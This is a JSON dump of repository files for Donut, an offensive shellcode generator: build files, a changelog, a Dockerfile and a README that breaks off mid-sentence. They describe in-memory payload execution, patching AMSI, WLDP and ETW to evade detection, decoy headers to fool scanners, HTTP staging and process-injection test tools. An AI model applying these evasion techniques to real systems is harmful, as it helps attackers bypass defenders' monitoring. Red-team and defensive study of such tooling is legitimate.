{
  "metadata": {
    "timestamp": 1736709741456,
    "page": 153,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjE2MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "TheWover/donut",
      "stars": 3695,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 3.44921875,
          "content": "## Ignore Visual Studio temporary files, build results, and\n## files generated by popular Visual Studio add-ons.\n\n# User-specific files\n*.suo\n*.user\n*.sln.docstates\n\n# Build results\n[Dd]ebug/\n[Dd]ebugPublic/\n[Rr]elease/\n[Rr]eleases/\nx64/\nx86/\nbld/\n[Bb]in/\n[Oo]bj/\nbuild/\n\n# Roslyn cache directories\n*.ide/\n.vs/\n\n# MSTest test Results\n[Tt]est[Rr]esult*/\n[Bb]uild[Ll]og.*\n\n# NUnit\n*.VisualState.xml\nTestResult.xml\nnunit-*.xml\n\n# Build Results of an ATL Project\n[Dd]ebugPS/\n[Rr]eleasePS/\ndlldata.c\n\n*_i.c\n*_p.c\n*_i.h\n*.ilk\n*.meta\n*.obj\n*.pch\n*.pdb\n*.pgc\n*.pgd\n*.rsp\n*.sbr\n*.tlb\n*.tli\n*.tlh\n*.tmp\n*.tmp_proj\n*.log\n*.vspscc\n*.vssscc\n.builds\n*.pidb\n*.svclog\n*.scc\n\n# Chutzpah Test files\n_Chutzpah*\n\n# Visual C++ cache files\nipch/\n*.aps\n*.ncb\n*.opensdf\n*.sdf\n*.cachefile\n\n# Visual Studio profiler\n*.psess\n*.vsp\n*.vspx\n\n# TFS 2012 Local Workspace\n$tf/\n\n# Guidance Automation Toolkit\n*.gpState\n\n# ReSharper is a .NET coding add-in\n_ReSharper*/\n*.[Rr]e[Ss]harper\n*.DotSettings.user\n\n# JustCode is a .NET coding addin-in\n.JustCode\n\n# TeamCity is a build add-in\n_TeamCity*\n\n# DotCover is a Code Coverage Tool\n*.dotCover\n\n# NCrunch\n_NCrunch_*\n.*crunch*.local.xml\n\n# MightyMoose\n*.mm.*\nAutoTest.Net/\n\n# Web workbench (sass)\n.sass-cache/\n\n# Installshield output folder\n[Ee]xpress/\n\n# DocProject is a documentation generator add-in\nDocProject/buildhelp/\nDocProject/Help/*.HxT\nDocProject/Help/*.HxC\nDocProject/Help/*.hhc\nDocProject/Help/*.hhk\nDocProject/Help/*.hhp\nDocProject/Help/Html2\nDocProject/Help/html\n\n# Click-Once directory\npublish/\n\n# Publish Web Output\n*.[Pp]ublish.xml\n*.azurePubxml\n# TODO: Comment the next line if you want to checkin your web deploy settings \n# but database connection strings (with potential passwords) will be unencrypted\n*.pubxml\n*.publishproj\n\n# NuGet Packages\n*.nupkg\n# The packages folder can be ignored because of Package Restore\n**/packages/*\n# except build/, which is used as an MSBuild target.\n!**/packages/build/\n# If using the old MSBuild-Integrated Package Restore, uncomment this:\n#!**/packages/repositories.config\nPackages.dgml\n\n# Windows Azure Build Output\ncsx/\n*.build.csdef\n\n# Windows Store app package directory\nAppPackages/\n\n# Others\nsql/\n*.Cache\nClientBin/\n[Ss]tyle[Cc]op.*\n~$*\n*~\n*.dbmdl\n*.dbproj.schemaview\n*.pfx\n*.publishsettings\nnode_modules/\n\n# RIA/Silverlight projects\nGenerated_Code/\n\n# Backup & report files from converting an old project file\n# to a newer Visual Studio version. Backup files are not needed,\n# because we have git ;-)\n_UpgradeReport_Files/\nBackup*/\nUpgradeLog*.XML\nUpgradeLog*.htm\n\n# SQL Server files\n*.mdf\n*.ldf\n\n# Business Intelligence projects\n*.rdl.data\n*.bim.layout\n*.bim_*.settings\n\n# Microsoft Fakes\nFakesAssemblies/\n\n# =========================\n# Operating System Files\n# =========================\n\n# OSX\n# =========================\n\n.DS_Store\n.AppleDouble\n.LSOverride\n\n# Icon must end with two \\r\nIcon\n\n\n# Thumbnails\n._*\n\n# Files that might appear on external disk\n.Spotlight-V100\n.Trashes\n\n# Directories potentially created on remote AFP share\n.AppleDB\n.AppleDesktop\nNetwork Trash Folder\nTemporary Items\n.apdisk\n\n# Windows\n# =========================\n\n# Windows image file caches\nThumbs.db\nehthumbs.db\n\n# Folder config file\nDesktop.ini\n\n# Recycle Bin used on file shares\n$RECYCLE.BIN/\n\n# Windows Installer files\n*.cab\n*.msi\n*.msm\n*.msp\n\n#OpenCover output\ncoverage.xml\n\n#Msbuild binary log output\noutput.binlog\n\n# KDiff3\n*_BACKUP_*\n*_BASE_*\n*_LOCAL_*\n*_REMOTE_*\n*.orig\n\nAkavacheSqliteLinkerOverride.cs\nNuGetBuild\nWiX.Toolset.DummyFile.txt\nGitHubVS.sln.DotSettings\n"
        },
        {
          "name": ".gitmodules",
          "type": "blob",
          "size": 0.1025390625,
          "content": "[submodule \"generators/go-donut\"]\n\tpath = generators/go-donut\n\turl = https://github.com/Binject/go-donut\n"
        },
        {
          "name": "CHANGELOG.md",
          "type": "blob",
          "size": 3.873046875,
          "content": "# Changelog\nAll notable changes to this project will be documented in this file.\n\n## [v1.0]\n\n### Added\n\n* Added module overloading for native PE payloads. Hides them in MEM_IMAGE memory backed by a decoy file on disk\n* If donut is set to mutate native PE headers, then for module overloads it will overwrite the payload's PE headers with those of the decoy file to fool some detections of module overloading\n* Added an option to block indefinitely after running the payload\n* Added Dockerfile to create a docker image for generating donut shellcode\n* Added support for binaries without relocation information or with certain edge cases for relocation information\n* Added custom GetProcAddress and LoadLibrary replacement functions that will only call those Win32 API calls as fallbacks\n* Better documentation for debugging, designing with, and integrating Donut.\n* Added moduler bypass system for ETW\n* Added option for preserving or overwriting PE headers of native payloads\n* Added an inject_local.exe that runs shellcode in the current process for testing purposes\n* C# output generator\n* Python output generator\n* UUID string output generator\n\n### Changed\n\n* The -y switch now uses the value provided as an offset from the base address of the process's executable module. So, for example, if you have injected donut into an infected, legitimate PE file, then once donut completes it will create a thread at the provided offset of that legitimate PE, allowing it to resume its legitimate execution and do what it was supposed to do in the first place.\n* Fixed some issues with the MingW makefile (#96)\n* Fixed and improved all makefiles\n* Fixed the Python module\n\n## [v0.9.3]\n\n### Added\n\n* The -e switch can be used to disable entropy and/or encryption. Options are: 1=none, 2=generate random names, 3=generate random names + use symmetric encryption.\n* The -z switch tells the builder to compress the input file. 1=none, 2=aPLib. On Windows, a further three algorithms are supported, which are 3=LZNT1, 4=Xpress and 5=Xpress Huffman.\n* The -f switch specifies the output format for loader. 1=binary, 2=base64, 3=c, 4=ruby, 5=python, 6=powershell, 7=c# and 8=hex. On Windows, Base64 strings are copied to the clipboard.\n* The -t switch tells the loader to run unmanaged entrypoint for EXE as a thread. This also attempts to intercept exit-related API in Import Address Table by replacing their pointers with the address of RtlExitUserThread.\n* The -n switch can be used to specify name of module for HTTP staging. If entropy is enabled, this is generated randomly.\n* The -s switch specifies the HTTP server to download module from.\n* The -y switch tells loader to create a new thread for the loader and continues executing at a specific address or Original Entry Point (OEP). The address should be provided as a string in hexadecimal format.\n* The -x switch can be used to specify how loader terminates. 1=exit thread, 2=exit process.\n* The -p switch is used to specify parameters to .NET method, DLL function or command line for an unmanaged EXE file. Wrap multiple parameters inside quotations.\n* The -w switch tells the loader to convert parameters to UNICODE before passing to unmanaged DLL function.\n* C# generator by n1xbyte: https://github.com/n1xbyte/donutCS\n* Go generator by awgh https://github.com/Binject/go-donut\n\n### Changed\n\n* Command line is no longer parsed using semi-colon or comma as a token. The -p switch now accepts a string with all parameters enclosed in quotation marks. For .NET DLL/EXE, these are separated by the loader using CommandLineToArgvW. For unmanaged DLL, the string is passed to the DLL function without any modification.\n* The -u switch to specify URL for HTTP stager is replaced with -s switch to prepare for a DNS stager.\n* The -f switch to specify input file is now used to specify output format of loader.\n\n### Removed\n\n* XSL files are no longer supported.\n* Code stub for calling DLL function with multiple arguments.\n"
        },
        {
          "name": "DemoCreateProcess",
          "type": "tree",
          "content": null
        },
        {
          "name": "Dockerfile",
          "type": "blob",
          "size": 0.4375,
          "content": "FROM ubuntu:22.04\n\nRUN apt-get update\nRUN apt-get install --no-install-recommends --no-install-suggests -y \\\n      mingw-w64 zip build-essential perl python3 xml2 pkg-config automake \\\n      libtool autotools-dev make g++ git ruby wget libssl-dev\n\nWORKDIR /opt\nRUN git clone https://github.com/TheWover/donut.git\nWORKDIR /opt/donut\nRUN make -f Makefile\n\nWORKDIR /workdir\nRUN chmod ugo+wrx /workdir\nRUN ls /opt/donut\nENTRYPOINT [\"/opt/donut/donut\"]\n"
        },
        {
          "name": "DonutTest",
          "type": "tree",
          "content": null
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.4814453125,
          "content": "BSD 3-Clause License\n\nCopyright (c) 2019, TheWover, Odzhan. All rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are met:\n\n* Redistributions of source code must retain the above copyright notice, this\n  list of conditions and the following disclaimer.\n\n* Redistributions in binary form must reproduce the above copyright notice,\n  this list of conditions and the following disclaimer in the documentation\n  and/or other materials provided with the distribution.\n\n* Neither the name of the copyright holder nor the names of its\n  contributors may be used to endorse or promote products derived from\n  this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\nAND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\nIMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\nDISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\nFOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\nDAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\nSERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\nCAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\nOR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n"
        },
        {
          "name": "MANIFEST.in",
          "type": "blob",
          "size": 0.2578125,
          "content": "include README.md\ninclude Makefile*\ninclude LICENSE\ninclude loader_exe_x64.h\ninclude loader_exe_x86.h\ninclude version-release-notes.txt\nrecursive-include . *.c\nrecursive-include loader *\nrecursive-include include *\nrecursive-include docs *\nrecursive-include lib *\n"
        },
        {
          "name": "Makefile",
          "type": "blob",
          "size": 1.1640625,
          "content": "donut: clean\n\tgcc -Wunused-function -Wall -fpack-struct=8 -DDONUT_EXE -I include donut.c hash.c encrypt.c format.c loader/clib.c lib/aplib64.a -odonut \n\tgcc -Wunused-function -Wall -c -fpack-struct=8 -fPIC -I include donut.c hash.c encrypt.c format.c loader/clib.c \n\tar rcs lib/libdonut.a donut.o hash.o encrypt.o format.o clib.o lib/aplib64.a\n\tgcc -Wall -shared -o lib/libdonut.so donut.o hash.o encrypt.o format.o clib.o lib/aplib64.a\ndebug: clean\n\tgcc -Wunused-function -ggdb -Wall -Wno-format -fpack-struct=8 -DDEBUG -DDONUT_EXE -I include donut.c hash.c encrypt.c format.c loader/clib.c lib/aplib64.a -odonut\nhash:\n\tgcc -Wall -Wno-format -fpack-struct=8 -DTEST -I include hash.c loader/clib.c -ohash\nencrypt:\n\tgcc -Wall -Wno-format -fpack-struct=8 -DTEST -I include encrypt.c loader/clib.c -oencrypt\ninject:\n\tgcc -Wall -Wno-format -fpack-struct=8 -DTEST -I include loader/inject.c -oinject\ninject_local:\n\tgcc -Wall -Wno-format -fpack-struct=8 -DTEST -I include loader/inject_local.c -oinject_local\nclean:\n\trm -f loader.exe exe2h.exe exe2h loader32.exe loader64.exe donut.o hash.o encrypt.o format.o clib.o hash encrypt donut hash.exe encrypt.exe donut.exe lib/libdonut.a lib/libdonut.so\n"
        },
        {
          "name": "Makefile.mingw",
          "type": "blob",
          "size": 1.8603515625,
          "content": "CC32 := i686-w64-mingw32-gcc\nCC64 := x86_64-w64-mingw32-gcc\n\ndonut: clean\n\t$(info ###### RELEASE ######)\n\tgcc -I include loader/exe2h/exe2h.c -oexe2h\n\t$(CC64) -I include loader/exe2h/exe2h.c loader/exe2h/mmap-windows.c -lshlwapi -oexe2h.exe\n\t\n\t$(CC32) -DBYPASS_AMSI_B -DBYPASS_WLDP_A -DBYPASS_ETW_B -fno-toplevel-reorder -fpack-struct=8 -fPIC -O0 -nostdlib loader/loader.c loader/depack.c loader/clib.c hash.c encrypt.c -I include -oloader.exe\n\t./exe2h loader.exe\n\t\n\t$(CC64) -DBYPASS_AMSI_B -DBYPASS_WLDP_A -DBYPASS_ETW_B -fno-toplevel-reorder -fpack-struct=8 -fPIC -O0 -nostdlib loader/loader.c loader/depack.c loader/clib.c hash.c encrypt.c -I include -oloader.exe\n\t./exe2h loader.exe\n\t\n\t$(CC64) -Wall -fpack-struct=8 -DDONUT_EXE -I include donut.c hash.c encrypt.c format.c loader/clib.c lib/aplib64.lib -odonut.exe\ndebug: clean\n\t$(info ###### DEBUG ######)\n\t$(CC32) -DCLIB -DBYPASS_AMSI_B -DBYPASS_WLDP_A -DBYPASS_ETW_B -Wno-format -fpack-struct=8 -DDEBUG -I include loader/loader.c hash.c encrypt.c loader/depack.c loader/clib.c -oloader32.exe -lole32 -lshlwapi\n\t$(CC64) -DCLIB -DBYPASS_AMSI_B -DBYPASS_WLDP_A -DBYPASS_ETW_B -Wno-format -fpack-struct=8 -DDEBUG -I include loader/loader.c hash.c encrypt.c loader/depack.c loader/clib.c -oloader64.exe -lole32 -lshlwapi\n\t$(CC64) -Wall -Wno-format -fpack-struct=8 -DDEBUG -DDONUT_EXE -I include donut.c hash.c encrypt.c format.c loader/clib.c lib/aplib64.lib -odonut.exe\n\t$(CC32) -Wall loader/inject.c -oinject32.exe\n\t$(CC64) -Wall loader/inject.c -oinject64.exe\n\t$(CC32) -Wall loader/inject_local.c -oinject_local32.exe\n\t$(CC64) -Wall loader/inject_local.c -oinject_local64.exe\nclean:\n\trm -f exe2h exe2h.exe loader.bin instance donut.o hash.o encrypt.o format.o clib.o hash encrypt donut hash.exe encrypt.exe donut.exe lib/libdonut.a lib/libdonut.so loader.exe loader32.exe loader64.exe inject32.exe inject64.exe inject_local32.exe inject_local64.exe\n\n"
        },
        {
          "name": "Makefile.msvc",
          "type": "blob",
          "size": 2.2001953125,
          "content": "donut: clean\n\t@echo ###### Building exe2h ######\n\tcl /nologo loader\\exe2h\\exe2h.c loader\\exe2h\\mmap-windows.c\n\t\n\t@echo ###### Building loader ######\n\tcl -DBYPASS_AMSI_B -DBYPASS_WLDP_A -DBYPASS_ETW_B -Zp8 -c -nologo -Gy -Os -O1 -GR- -EHa -Oi -GS- -I include loader\\loader.c hash.c encrypt.c loader\\depack.c loader\\clib.c \n\tlink -nologo -order:@loader\\order.txt -entry:DonutLoader -fixed -subsystem:console -nodefaultlib loader.obj hash.obj encrypt.obj depack.obj clib.obj\n\texe2h loader.exe\n\t\n\t@echo ###### Building generator ######\n\trc include\\donut.rc\n\tcl -Zp8 -DDONUT_EXE -I include donut.c hash.c encrypt.c format.c loader\\clib.c lib\\aplib64.lib include\\donut.res\n\tcl -Zp8 -nologo -DDLL -LD -I include donut.c hash.c encrypt.c format.c loader\\clib.c lib\\aplib64.lib\n\tmove donut.lib lib\\donut.lib\n\tmove donut.exp lib\\donut.exp\n\tmove donut.dll lib\\donut.dll\n\n\t@echo ###### Building injection testing tools ######\n\tcl -Zp8 -nologo -DTEST -I include loader\\inject.c\n\tcl -Zp8 -nologo -DTEST -I include loader\\inject_local.c\ndebug: clean\n\tcl /nologo -DDEBUG -DBYPASS_AMSI_B -DBYPASS_WLDP_A -DBYPASS_ETW_B -Zp8 -c -nologo -Gy -Os -EHa -GS- -I include loader\\loader.c hash.c encrypt.c loader\\depack.c loader\\clib.c\n\tlink -nologo -order:@loader\\order.txt -subsystem:console loader.obj hash.obj encrypt.obj depack.obj clib.obj\n  \n\tcl -Zp8 -nologo -DDEBUG -DDONUT_EXE -I include donut.c hash.c encrypt.c format.c loader\\clib.c lib\\aplib64.lib\n\tcl -Zp8 -nologo -DDEBUG -DDLL -LD -I include donut.c hash.c encrypt.c format.c loader\\clib.c lib\\aplib64.lib\n\tmove donut.lib lib\\donut.lib\n\tmove donut.exp lib\\donut.exp\n\tmove donut.dll lib\\donut.dll\n\n\tcl -Zp8 -nologo -DTEST -I include loader\\inject.c\n\tcl -Zp8 -nologo -DTEST -I include loader\\inject_local.c\nhash:\n\tcl -Zp8 -nologo -DTEST -I include hash.c loader\\clib.c\nencrypt:\n\tcl -Zp8 -nologo -DTEST -I include encrypt.c\ninject:\n\tcl -Zp8 -nologo -DTEST -I include loader\\inject.c\ninject_local:\n\tcl -Zp8 -nologo -DTEST -I include loader\\inject_local.c\nclean:\n\t@del /Q mmap-windows.obj donut.obj hash.obj encrypt.obj inject.obj inject_local.obj depack.obj format.obj clib.obj exe2h.exe loader.exe hash.exe encrypt.exe inject.exe inject_local.exe donut.exe lib\\donut.lib lib\\donut.exp lib\\donut.dll include\\donut.res\n"
        },
        {
          "name": "Makefile_x86.msvc",
          "type": "blob",
          "size": 2.2001953125,
          "content": "donut: clean\n\t@echo ###### Building exe2h ######\n\tcl /nologo loader\\exe2h\\exe2h.c loader\\exe2h\\mmap-windows.c\n\t\n\t@echo ###### Building loader ######\n\tcl -DBYPASS_AMSI_B -DBYPASS_WLDP_A -DBYPASS_ETW_B -Zp8 -c -nologo -Gy -Os -O1 -GR- -EHa -Oi -GS- -I include loader\\loader.c hash.c encrypt.c loader\\depack.c loader\\clib.c \n\tlink -nologo -order:@loader\\order.txt -entry:DonutLoader -fixed -subsystem:console -nodefaultlib loader.obj hash.obj encrypt.obj depack.obj clib.obj\n\texe2h loader.exe\n\t\n\t@echo ###### Building generator ######\n\trc include\\donut.rc\n\tcl -Zp8 -DDONUT_EXE -I include donut.c hash.c encrypt.c format.c loader\\clib.c lib\\aplib32.lib include\\donut.res\n\tcl -Zp8 -nologo -DDLL -LD -I include donut.c hash.c encrypt.c format.c loader\\clib.c lib\\aplib32.lib\n\tmove donut.lib lib\\donut.lib\n\tmove donut.exp lib\\donut.exp\n\tmove donut.dll lib\\donut.dll\n\n\t@echo ###### Building injection testing tools ######\n\tcl -Zp8 -nologo -DTEST -I include loader\\inject.c\n\tcl -Zp8 -nologo -DTEST -I include loader\\inject_local.c\ndebug: clean\n\tcl /nologo -DDEBUG -DBYPASS_AMSI_B -DBYPASS_WLDP_A -DBYPASS_ETW_B -Zp8 -c -nologo -Gy -Os -EHa -GS- -I include loader\\loader.c hash.c encrypt.c loader\\depack.c loader\\clib.c\n\tlink -nologo -order:@loader\\order.txt -subsystem:console loader.obj hash.obj encrypt.obj depack.obj clib.obj\n  \n\tcl -Zp8 -nologo -DDEBUG -DDONUT_EXE -I include donut.c hash.c encrypt.c format.c loader\\clib.c lib\\aplib32.lib\n\tcl -Zp8 -nologo -DDEBUG -DDLL -LD -I include donut.c hash.c encrypt.c format.c loader\\clib.c lib\\aplib32.lib\n\tmove donut.lib lib\\donut.lib\n\tmove donut.exp lib\\donut.exp\n\tmove donut.dll lib\\donut.dll\n\n\tcl -Zp8 -nologo -DTEST -I include loader\\inject.c\n\tcl -Zp8 -nologo -DTEST -I include loader\\inject_local.c\nhash:\n\tcl -Zp8 -nologo -DTEST -I include hash.c loader\\clib.c\nencrypt:\n\tcl -Zp8 -nologo -DTEST -I include encrypt.c\ninject:\n\tcl -Zp8 -nologo -DTEST -I include loader\\inject.c\ninject_local:\n\tcl -Zp8 -nologo -DTEST -I include loader\\inject_local.c\nclean:\n\t@del /Q mmap-windows.obj donut.obj hash.obj encrypt.obj inject.obj inject_local.obj depack.obj format.obj clib.obj exe2h.exe loader.exe hash.exe encrypt.exe inject.exe inject_local.exe donut.exe lib\\donut.lib lib\\donut.exp lib\\donut.dll include\\donut.res\n"
        },
        {
          "name": "ModuleMonitor",
          "type": "tree",
          "content": null
        },
        {
          "name": "ProcessManager",
          "type": "tree",
          "content": null
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 18.46875,
          "content": "[![Issues](https://img.shields.io/github/issues/thewover/donut)](https://github.com/TheWover/donut/issues)\n[![Contributors](https://img.shields.io/github/contributors/thewover/donut)](https://github.com/TheWover/donut/graphs/contributors)\n[![Stars](https://img.shields.io/github/stars/thewover/donut)](https://github.com/TheWover/donut/stargazers)\n[![Forks](https://img.shields.io/github/forks/thewover/donut)](https://github.com/TheWover/donut/network/members)\n[![License](https://img.shields.io/github/license/thewover/donut)](https://github.com/TheWover/donut/blob/master/LICENSE)\n[![Chat](https://img.shields.io/badge/chat-%23donut-orange)](https://bloodhoundgang.herokuapp.com/)\n[![Github All Releases](https://img.shields.io/github/downloads/thewover/donut/total.svg)](http://www.somsubhra.com/github-release-stats/?username=thewover&repository=donut) \n[![Twitter URL](https://img.shields.io/twitter/url/http/shields.io.svg?style=social)](https://twitter.com/intent/tweet?original_referer=https://github.com/TheWover/donut&text=%23Donut+An+open-source+shellcode+generator+that+supports+in%2Dmemory+execution+of+VBS%2FJS%2FEXE%2FDLL+files:+https://github.com/TheWover/donut)\n\n![Alt text](https://github.com/TheWover/donut/blob/master/img/donut_logo_white.jpg?raw=true \"Donut Logo\")\n\n<p>Current version: <a href=\"https://github.com/TheWover/donut/releases\">v1.1</a></p>\n\n<h2>Table of contents</h2>\n\n<ol>\n  <li><a href=\"#intro\">Introduction</a></li>\n  <li><a href=\"#how\">How It Works</a></li>\n  <li><a href=\"#build\">Building</a></li>\n  <li><a href=\"#usage\">Usage</a></li>\n  <li><a href=\"#subproj\">Subprojects</a></li>\n  <li><a href=\"#dev\">Developing with Donut</a></li>\n  <li><a href=\"#qad\">Questions and Discussions</a></li>\n  <li><a href=\"#disclaimer\">Disclaimer</a></li>\n</ol>\n\n<h2 id=\"intro\">1. Introduction</h2>\n\n<p><strong>Donut</strong> is a position-independent code that enables in-memory execution of VBScript, JScript, EXE, DLL files and dotNET assemblies. A module created by Donut can either be staged from a HTTP server or embedded directly in the loader itself. The module is optionally encrypted using the <a href=\"https://tinycrypt.wordpress.com/2017/02/20/asmcodes-chaskey-cipher/\">Chaskey</a> block cipher and a 128-bit randomly generated key. After the file is loaded and executed in memory, the original reference is erased to deter memory scanners. The generator and loader support the following features:</p>\n\n<ul>\n  <li>Compression of input files with aPLib and LZNT1, Xpress, Xpress Huffman via RtlCompressBuffer.</li> \n  <li>Using entropy for API hashes and generation of strings.</li> \n  <li>128-bit symmetric encryption of files.</li>\n  <li>Overwriting native PE headers.</li>\n  <li>Storing native PEs in MEM_IMAGE memory.</li>\n  <li>Patching Antimalware Scan Interface (AMSI) and Windows Lockdown Policy (WLDP).</li>\n  <li>Patching Event Tracing for Windows (ETW).</li>\n  <li>Patching command line for EXE files.</li>\n  <li>Patching exit-related API to avoid termination of host process.</li>\n  <li>Multiple output formats: C, Ruby, Python, PowerShell, Base64, C#, Hexadecimal, and UUID string.</li>\n</ul>\n\n<p>There are dynamic and static libraries for both Linux and Windows that can be integrated into your own projects. There's also a python module which you can read more about in <a href=\"https://github.com/TheWover/donut/blob/master/docs/2019-08-21-Python_Extension.md\">Building and using the Python extension.</a></p>\n\n<h2 id=\"how\">2. How It Works</h2>\n\n<p>Donut contains individual loaders for each supported file type. For dotNET EXE/DLL assemblies, Donut uses the Unmanaged CLR Hosting API to load the Common Language Runtime. Once the CLR is loaded into the host process, a new Application Domain is created to allow for running Assemblies in disposable AppDomains. When the AppDomain is ready, the dotNET Assembly is loaded via the AppDomain.Load_3 method. Finally, the Entry Point for EXEs or public method for DLLs specified by the user is invoked with any additional parameters. Refer to MSDN for documentation on the <a href=\" https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/clr-hosting-interfaces\">Unmanaged CLR Hosting API.</a> For a standalone example of a CLR Host, refer to <a href=\"https://github.com/TheWover/donut/blob/master/DonutTest/rundotnet.cpp\">code here.</a></p>\n\n<p>VBScript and JScript files are executed using the IActiveScript interface. There's also minimal support for some of the methods provided by the Windows Script Host (wscript/cscript). For a standalone example, refer to <a href=\"https://gist.github.com/odzhan/d18145b9538a3653be2f9a580b53b063\">code here.</a> For a more detailed description, read: <a href=\"https://modexp.wordpress.com/2019/07/21/inmem-exec-script/\">In-Memory Execution of JavaScript, VBScript, JScript and XSL</a></p>\n\n<p>Unmanaged or native EXE/DLL files are executed using a custom PE loader with support for Delayed Imports, TLS and patching the command line. Only files with relocation information are supported. Read <a href=\"https://modexp.wordpress.com/2019/06/24/inmem-exec-dll/\">In-Memory Execution of DLL</a> for more information.</p>\n\n<p>The loader can disable AMSI and WLDP to help evade detection of malicious files executed in-memory. For more information, read <a href=\"https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/\">How Red Teams Bypass AMSI and WLDP for .NET Dynamic Code</a>. It also supports decompression of files in memory using aPLib or the RtlDecompressBuffer API. Read <a href=\"https://modexp.wordpress.com/2019/12/08/shellcode-compression/\">Data Compression</a> for more information.</p>\n\n<p>As of v1.0, ETW is also bypassed. Like with AMSI/WLDP, this a modular system that allows you to swap out the default bypass with your own. The default bypass is derived from research by XPN. Read <a href=\"https://blog.xpnsec.com/hiding-your-dotnet-etw/\">Hiding your .NET - ETW</a> for more information.</p>\n\n<p>By default, the loader will overwrite the PE headers of unmanaged PEs (from the base address to `IMAGE_OPTIONAL_HEADER.SizeOfHeaders`). If no decoy module is used (module overloading), then the PE headers will be zeroed. If a decoy module is used, the PE headers of the decoy module will be used to overwrite those of the payload module. This is to deter detection by comparing the PE headers of modules in memory with the file backing them on disk. The user may request that all PE headers be preserved in their original state. This is helpful for scenarios when the payload module needs to access its PE headers, such as when looking up embedded PE resources.</p>\n\n<p>For a detailed walkthrough using the generator and how Donut affects tradecraft, read <a href=\"https://thewover.github.io/Introducing-Donut/\">Donut - Injecting .NET Assemblies as Shellcode</a>. For more information about the loader, read <a href=\"https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/\">Loading .NET Assemblies From Memory</a>.</p>\n\n<p>Those who wish to know more about the internals should refer to <a href=\"https://github.com/TheWover/donut/blob/master/docs/devnotes.md\">Developer notes.</a></p>\n\n<h2 id=\"build\">3. Building</h2>\n\n<p>There are two types of build. If you want to debug Donut, please refer to <a href=\"https://github.com/TheWover/donut/blob/master/docs/devnotes.md\">documentation here</a>. If not, continue reading for the release build.</p>\n\n<h3><strong>Clone</strong></h3>\n\n<p>From a Windows command prompt or Linux terminal, clone the repository.</p>\n\n<pre> \n  git clone http://github.com/thewover/donut.git\n</pre>\n\n<p>The next step depends on your operating system and what compiler you decide to use. Currently, the generator and loader template for Donut can be compiled successfully with both Microsoft Visual Studio 2019 and MingGW-64. To use the libraries in your own C/C++ project, please refer to the <a href=\"https://github.com/TheWover/donut/tree/master/examples\">examples provided here.</a></p>\n\n<h4><strong>Windows</strong></h4>\n\n<p>To generate the loader template, dynamic library donut.dll, the static library donut.lib and the generator donut.exe. Start an x64 Microsoft Visual Studio Developer Command Prompt, change to the directory where you cloned the Donut repository and enter the following:</p>\n\n<pre>\n  nmake -f Makefile.msvc\n</pre>\n\n<p>To do the same, except using MinGW-64 on Windows or Linux, change to the directory where you cloned the Donut repository and enter the following:</p>\n\n<pre>\n  make -f Makefile.mingw\n</pre>\n\n<h4><strong>Linux</strong></h4>\n\n<p>To generate the dynamic library donut.so, the static library donut.a and the generator donut. Change to the directory where you cloned the Donut repository and simply type make.</p>\n\n<h3>Python Module</h3>\n\n<p>Donut can be installed and used as a Python module. To install from source requires pip for Python3. First, ensure older versions of donut-shellcode are not installed by issuing the following command on Linux terminal or Microsoft Visual Studio command prompt.</p>\n\n<pre>\n  pip3 uninstall donut-shellcode\n</pre>\n\n<p>After you confirm older versions are no longer installed, issue the following command.</p>\n\n<pre>\n  pip3 install .\n</pre>\n\n<p>You may also install Donut as a Python module by grabbing it from the PyPi repository.</p>\n\n<pre>\n  pip3 install donut-shellcode\n</pre>\n\n<p>For more information, please refer to <a href=\"https://github.com/TheWover/donut/blob/master/docs/2019-08-21-Python_Extension.md\">Building and using the Python extension.</a></p>\n\n<h3>Docker</h3>\n\n<p>Building the docker container.</p>\n\n<pre>\n  docker build -t donut .\n</pre>\n\n<p>Running donut.</p>\n\n<pre>\n  docker run -it --rm -v \"${PWD}:/workdir\" donut -h\n</pre>\n\n<h3>Support Tools</h3>\n\n<p>Donut includes several other executables that may be built separately. This include \"hash.exe\", \"encrypt.exe\",\"inject.exe\", and \"inject_local.exe\". The first two are used in shellcode generation. The latter two are provided to assist with testing donut shellcode. \"inject.exe\" will inject a raw binary file (loader.bin) into a process by its PID or process name. \"inject_local.exe\" will inject a raw binary file into its own process.</p>\n\n<p>To build these support executables separately you may use the MSVC makefile. For example, to build \"inject_local.exe\" to test your donut shellcode, you may run.</p>\n\n<pre>\n  nmake inject_local -f Makefile.msvc\n</pre>\n\n<h3>Releases</h3>\n\n<p>Tags have been provided for each release version of Donut that contain the compiled executables.</p>\n\n<ul>\n  <li><a href=\"https://github.com/TheWover/donut/releases/tag/v0.9.3\">v0.9.3, TBD</a></li>\n  <li><a href=\"https://github.com/TheWover/donut/releases/tag/v0.9.2\">v0.9.2, Bear Claw</a></li>\n  <li><a href=\"https://github.com/TheWover/donut/releases/tag/v0.9.1\">v0.9.1, Apple Fritter</a></li>\n  <li><a href=\"https://github.com/TheWover/donut/releases/tag/v0.9\">v0.9.0, Initial Release</a></li>\n</ul>\n\n<p>Currently, there are two other generators 